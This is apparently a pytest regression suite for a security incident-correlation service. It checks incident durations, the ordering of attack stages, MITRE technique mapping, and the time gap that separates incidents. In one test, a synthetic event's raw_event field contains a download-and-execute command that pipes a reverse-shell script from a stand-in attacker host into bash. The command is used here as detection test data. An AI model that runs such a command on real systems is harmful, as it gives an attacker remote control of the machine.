import pytest
import httpx
from datetime import datetime, timedelta

BASE_URL = "http://127.0.0.1:8000"

@pytest.mark.asyncio
async def test_incident_correlation_regression():
    async with httpx.AsyncClient(timeout=30.0) as client:
        # Check target incident e51a686c-f42c-4bfc-88d1-fd68c17930ca
        target_id = "e51a686c-f42c-4bfc-88d1-fd68c17930ca"
        res = await client.get(f"{BASE_URL}/api/v1/incidents/{target_id}")
        assert res.status_code == 200, f"Failed to get target incident: {res.text}"
        inc_data = res.json()["incident"]
        
        # Verify timestamps & duration for target incident
        f_seen = datetime.fromisoformat(inc_data["first_seen"])
        l_seen = datetime.fromisoformat(inc_data["last_seen"])
        assert f_seen <= l_seen
        dur_expected = (l_seen - f_seen).total_seconds()
        assert abs(inc_data["duration_seconds"] - dur_expected) < 0.1
        assert abs(inc_data["duration_minutes"] - (dur_expected / 60.0)) < 0.1

        # Check TraceAI for target incident
        trace_res = await client.get(f"{BASE_URL}/api/v1/incidents/{target_id}/trace")
        assert trace_res.status_code == 200
        trace = trace_res.json()

        # 1. TraceAI Isolation: Target incident must ONLY contain events from Attack 1 (~07:11), NONE from Attack 2 (~07:36)
        timeline = trace.get("timeline", [])
        for ev in timeline:
            ev_time = datetime.fromisoformat(ev["timestamp"])
            assert ev_time.minute < 30, f"Event timestamp {ev['timestamp']} leaked from Attack 2 into target incident!"
            assert f_seen <= ev_time <= l_seen, f"Event timestamp {ev_time} out of bounds [{f_seen}, {l_seen}]"

        # 2. Stage Ordering: Verify chronological contiguous order: 1, 2, 3...
        stages = trace.get("stages", [])
        orders = [s["order"] for s in stages]
        assert orders == list(range(1, len(stages) + 1)), f"Stage orders are not contiguous 1..N: {orders}"
        
        # Stage first_seen must be chronological
        for i in range(len(stages) - 1):
            s1_time = datetime.fromisoformat(stages[i]["first_seen"])
            s2_time = datetime.fromisoformat(stages[i+1]["first_seen"])
            assert s1_time <= s2_time, f"Stages not chronological: {stages[i]['name']} ({s1_time}) > {stages[i+1]['name']} ({s2_time})"


@pytest.mark.asyncio
async def test_new_simulation_correlation_and_isolation():
    async with httpx.AsyncClient(timeout=30.0) as client:
        # Run new simulation with unique attacker IP
        attacker_ip = "192.168.42.100"
        target_ip = "10.10.10.20"
        
        # Attack 1
        sim1 = await client.post(f"{BASE_URL}/api/v1/simulate/full-attack?attacker_ip={attacker_ip}&target_ip={target_ip}")
        assert sim1.status_code == 200
        d1 = sim1.json()
        assert d1["incidents_created"] >= 1
        assert "event_first_seen" in d1 and "event_last_seen" in d1
        
        # Get incident created for Attack 1
        inc_list1 = await client.get(f"{BASE_URL}/api/v1/incidents?limit=5")
        assert inc_list1.status_code == 200
        inc1 = next((i for i in inc_list1.json() if attacker_ip in i.get("source_entities", [])), None)
        assert inc1 is not None, f"Could not find incident for {attacker_ip}"
        inc1_id = inc1["id"]
        
        # Trace for Attack 1
        t1_res = await client.get(f"{BASE_URL}/api/v1/incidents/{inc1_id}/trace")
        assert t1_res.status_code == 200
        t1 = t1_res.json()
        
        # Verify duration
        f1 = datetime.fromisoformat(inc1["first_seen"])
        l1 = datetime.fromisoformat(inc1["last_seen"])
        assert f1 <= l1
        expected_dur1 = (l1 - f1).total_seconds()
        assert abs(inc1["duration_seconds"] - expected_dur1) < 0.1
        # Duration for normal simulated attack should be short (e.g. < 60s), not 25 minutes
        assert inc1["duration_seconds"] < 60.0, f"Duration too large: {inc1['duration_seconds']}"
        
        # Verify stage ordering is contiguous 1..N
        stages1 = t1.get("stages", [])
        assert [s["order"] for s in stages1] == list(range(1, len(stages1) + 1))
        
        # Verify MITRE techniques
        mitre_res = await client.get(f"{BASE_URL}/api/v1/incidents/{inc1_id}/mitre")
        assert mitre_res.status_code == 200
        mitre_data = mitre_res.json()
        tech_ids = {t["id"] for t in mitre_data.get("techniques", [])}
        expected_techs = {"T1046", "T1110", "T1078", "T1059"}
        assert expected_techs.issubset(tech_ids), f"Missing techniques: {expected_techs - tech_ids}"


@pytest.mark.asyncio
async def test_correlation_gap_boundary():
    """Test that events beyond INCIDENT_CORRELATION_WINDOW_SECONDS start a new incident."""
    from app.services.event_service import EventService
    from app.models.schemas import EventCreate, Severity
    from app.models.database import Incident
    from app.db.session import SessionLocal
    from datetime import timezone
    import uuid

    test_ip = f"172.31.{uuid.uuid4().hex[:2]}.{uuid.uuid4().hex[:2]}"
    now = datetime.now(timezone.utc).replace(tzinfo=None)

    # Attack 1 events (Port scanning requires 3 events within 60s)
    ev_attack1_a = EventCreate(
        event_type="port_scan",
        host="srv-prod-01",
        source_ip=test_ip,
        severity=Severity.MEDIUM,
        timestamp=now - timedelta(seconds=620), # ~10 mins ago
        raw_event="Port scan detected on port 22"
    )
    ev_attack1_b = EventCreate(
        event_type="port_scan",
        host="srv-prod-01",
        source_ip=test_ip,
        severity=Severity.MEDIUM,
        timestamp=now - timedelta(seconds=615),
        raw_event="Port scan detected on port 80"
    )
    ev_attack1_c = EventCreate(
        event_type="port_scan",
        host="srv-prod-01",
        source_ip=test_ip,
        severity=Severity.MEDIUM,
        timestamp=now - timedelta(seconds=610),
        raw_event="Port scan detected on port 443"
    )

    # Attack 2 event: Command execution 10 minutes later (gap = 610s > 300s window)
    ev_attack2 = EventCreate(
        event_type="command_execution",
        host="srv-prod-01",
        source_ip=test_ip,
        username="root",
        severity=Severity.HIGH,
        timestamp=now,
        raw_event="curl http://attacker.com/rev.sh | bash"
    )

    db = SessionLocal()
    try:
        service = EventService(db)
        # Process Attack 1 events
        service.process_event(ev_attack1_a)
        service.process_event(ev_attack1_b)
        service.process_event(ev_attack1_c)
        
        incidents = db.query(Incident).filter(Incident.source_entities.contains([test_ip])).all()
        assert len(incidents) == 1, f"Expected 1 incident for attack 1, found {len(incidents)}"
        first_inc = incidents[0]
        first_inc_id = first_inc.id

        # Process Attack 2 (> 300s later)
        service.process_event(ev_attack2)
        
        incidents_after = db.query(Incident).filter(Incident.source_entities.contains([test_ip])).all()
        assert len(incidents_after) == 2, f"Expected 2 incidents separated by gap, found {len(incidents_after)}"
        
        # Verify first incident wasn't corrupted by ev_attack2
        db.refresh(first_inc)
        assert first_inc.last_seen < now - timedelta(seconds=500)
    finally:
        db.close()
